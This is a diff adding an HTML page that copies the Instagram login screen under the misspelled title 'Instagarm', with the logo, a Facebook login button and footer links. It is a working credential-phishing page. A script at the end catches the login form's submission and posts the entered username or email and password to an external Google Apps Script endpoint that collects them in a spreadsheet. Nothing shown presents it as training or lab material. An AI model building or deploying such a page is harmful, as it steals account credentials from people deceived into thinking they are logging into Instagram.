@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagarm Login </title>
+    <link rel="icon" type="image/x-icon" href="instagram.png">
+
+    <link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <img src="Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+            <form class="login-form" name="submit-to-google-sheet">
+                <input type="text" placeholder="Phone number, username, or email" required name="name">
+                <input type="password" placeholder="Password" required name="password">
+                <button type="submit"><a href="majak.html">Log in</a></button>
+            </form>
+            <div class="divider">
+                <div class="line"></div>
+                <div class="or">OR</div>
+                <div class="line"></div>
+            </div>
+            <button class="login-facebook"> <img src="facebook.png" alt="" class="fb"> &nbsp; Log in with
+                Facebook</button>
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#" class="signup-link" style="font-size: 12px;">Sign up</a></p>
+
+        </div>
+        <div class="social">
+            <p>Get the app.</p>
+            <div class="images"><img src="google play.png" alt="" class="img1"> <img src="microsoft.png" alt=""
+                    class="img2"></div>
+        </div>
+        <div class="bottom">
+            <p>Meta &nbsp; &nbsp;
+                About &nbsp;&nbsp;
+                Blog &nbsp;&nbsp;
+                Jobs &nbsp;&nbsp;
+                Help &nbsp;&nbsp;
+                API <br>
+                Privacy &nbsp;&nbsp;
+                Terms &nbsp;&nbsp;
+                Locations &nbsp;&nbsp;
+                Instagram Lite <br>
+                Threads &nbsp;&nbsp;
+                Contact Uploading & Non-Users <br>
+            </p>
+            <p>Meta Verified</p>
+            <p>
+                English &nbsp;
+                © 2024 Instagarm from av</p>
+        </div>
+    </div>
+
+    <!-- <form name="submit-to-google-sheet">
+<input name="email" type="email" placeholder="Email" required>
+<button type="submit">Send</button>
+</form> -->
+    <script>
+
+
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbz347GD75uqN-6EfCN4QBX0Auhku5Xqwq1T0sQkBdPFYWleY1dzieL6zaj6yu0i-ItG/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+    
+    </script>
+</body>
+
+</html>
